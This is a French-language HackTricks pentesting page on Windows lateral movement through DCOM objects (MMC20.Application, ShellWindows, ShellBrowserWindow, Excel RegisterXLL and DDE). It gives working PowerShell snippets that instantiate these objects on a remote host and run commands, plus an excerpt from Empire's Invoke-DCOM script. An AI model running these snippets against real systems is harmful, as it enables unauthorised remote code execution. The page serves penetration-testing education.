# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

## MMC20.Application

Les objets **DCOM** (Distributed Component Object Model) sont **intéressants** en raison de leur capacité à **interagir** avec les objets **sur le réseau**. Microsoft a une bonne documentation sur DCOM [ici](https://msdn.microsoft.com/en-us/library/cc226801.aspx) et sur COM [ici](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Vous pouvez trouver une liste solide d'applications DCOM en utilisant PowerShell, en exécutant `Get-CimInstance Win32_DCOMApplication`.

L'objet COM [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) vous permet de scripter des composants d'opérations de snap-in MMC. En énumérant les différentes méthodes et propriétés de cet objet COM, j'ai remarqué qu'il existe une méthode nommée `ExecuteShellCommand` sous Document.ActiveView.

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

Vous pouvez en savoir plus sur cette méthode [ici](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Jusqu'à présent, nous avons une application DCOM à laquelle nous pouvons accéder sur le réseau et qui peut exécuter des commandes. La dernière pièce consiste à exploiter cette application DCOM et la méthode ExecuteShellCommand pour obtenir l'exécution de code sur un hôte distant.

Heureusement, en tant qu'administrateur, vous pouvez interagir à distance avec DCOM avec PowerShell en utilisant "`[activator]::CreateInstance([type]::GetTypeFromProgID`". Tout ce que vous avez à faire est de lui fournir un ProgID DCOM et une adresse IP. Il vous fournira ensuite une instance de cet objet COM à distance :

![](<../../.gitbook/assets/image (665).png>)

Il est alors possible d'appeler la méthode `ExecuteShellCommand` pour démarrer un processus sur l'hôte distant :

![](<../../.gitbook/assets/image (1) (4) (1).png>)

## ShellWindows & ShellBrowserWindow

L'objet **MMC20.Application** manquait de "LaunchPermissions" explicites, ce qui entraînait l'accès des administrateurs par défaut :

![](<../../.gitbook/assets/image (4) (1) (2).png>)

Vous pouvez en savoir plus sur ce fil [ici](https://twitter.com/tiraniddo/status/817532039771525120).\
Visualiser les autres objets qui n'ont pas de LaunchPermission explicite peut être réalisé en utilisant [OleView .NET](https://github.com/tyranid/oleviewdotnet) de [@tiraniddo](https://twitter.com/tiraniddo), qui a d'excellents filtres Python (entre autres choses). Dans ce cas, nous pouvons filtrer tous les objets qui n'ont pas de Launch Permission. En le faisant, deux objets ont attiré mon attention : `ShellBrowserWindow` et `ShellWindows` :

![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)

Une autre façon d'identifier les objets cibles potentiels est de rechercher la valeur `LaunchPermission` manquante dans les clés de `HKCR:\AppID\{guid}`. Un objet avec des autorisations de lancement définies ressemblera à ce qui suit, les données représentant la liste de contrôle d'accès pour l'objet au format binaire :

![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)

Ceux qui n'ont pas de LaunchPermission explicite manqueront cette entrée de registre spécifique.

### ShellWindows

Le premier objet exploré était [ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx). Étant donné qu'il n'y a pas de [ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx) associé à cet objet, nous pouvons utiliser la méthode .NET [Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) associée à la méthode [Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx) pour instancier l'objet via son AppID sur un hôte distant. Pour ce faire, nous devons obtenir le [CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx) pour l'objet ShellWindows, ce qui peut être accompli en utilisant OleView .NET également :

![shellwindow\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellwindow\_classid.png?w=434\&h=424)

Comme vous pouvez le voir ci-dessous, le champ "Launch Permission" est vide, ce qui signifie qu'aucune autorisation explicite n'est définie.

![screen-shot-2017-01-23-at-4-12-24-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-12-24-pm.png?w=455\&h=401)

Maintenant que nous avons le CLSID, nous pouvons instancier l'objet sur une cible distante :
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```
![](https://enigma0x3.files.wordpress.com/2017/01/remote\_instantiation\_shellwindows.png?w=690\&h=354)

Une fois l'objet instancié sur l'hôte distant, nous pouvons interagir avec lui et invoquer n'importe quelle méthode que nous voulons. La poignée retournée à l'objet révèle plusieurs méthodes et propriétés, avec lesquelles nous ne pouvons pas interagir. Pour interagir réellement avec l'hôte distant, nous devons accéder à la méthode [WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx), qui nous donnera un objet représentant la fenêtre de la coquille Windows :
```
$item = $obj.Item()
```
![](https://enigma0x3.files.wordpress.com/2017/01/item\_instantiation.png?w=416\&h=465)

Avec une poignée complète sur la fenêtre Shell, nous pouvons maintenant accéder à toutes les méthodes/propriétés attendues qui sont exposées. Après avoir parcouru ces méthodes, **`Document.Application.ShellExecute`** a attiré notre attention. Assurez-vous de suivre les exigences de paramètres pour la méthode, qui sont documentées [ici](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745\(v=vs.85\).aspx).
```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
![](https://enigma0x3.files.wordpress.com/2017/01/shellwindows\_command\_execution.png?w=690\&h=426)

Comme vous pouvez le voir ci-dessus, notre commande a été exécutée avec succès sur un hôte distant.

### ShellBrowserWindow

Cet objet particulier n'existe pas sous Windows 7, ce qui limite un peu plus son utilisation pour le mouvement latéral que l'objet "ShellWindows", que j'ai testé avec succès sur Win7-Win10.

D'après mon énumération de cet objet, il semble fournir efficacement une interface dans la fenêtre de l'Explorateur, tout comme le précédent objet. Pour instancier cet objet, nous devons obtenir son CLSID. De même que ci-dessus, nous pouvons utiliser OleView .NET :

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

Encore une fois, notez le champ d'autorisation de lancement vide :

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

Avec le CLSID, nous pouvons répéter les étapes prises sur l'objet précédent pour instancier l'objet et appeler la même méthode :
```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
![](https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow\_command\_execution.png?w=690\&h=441)

Comme vous pouvez le voir, la commande a été exécutée avec succès sur la cible distante.

Comme cet objet interagit directement avec la coquille Windows, nous n'avons pas besoin d'invoquer la méthode "ShellWindows.Item", comme sur l'objet précédent.

Bien que ces deux objets DCOM puissent être utilisés pour exécuter des commandes shell sur un hôte distant, il existe de nombreuses autres méthodes intéressantes qui peuvent être utilisées pour énumérer ou altérer une cible distante. Quelques-unes de ces méthodes comprennent :

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE & RegisterXLL

De manière similaire, il est possible de se déplacer latéralement en abusant des objets DCOM Excel, pour plus d'informations, lisez [https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```
## Outil

Le script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) permet d'invoquer facilement toutes les méthodes commentées pour exécuter du code sur d'autres machines.

## Références

* La première méthode a été copiée depuis [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/), pour plus d'informations, suivez le lien.
* La deuxième section a été copiée depuis [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/), pour plus d'informations, suivez le lien.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
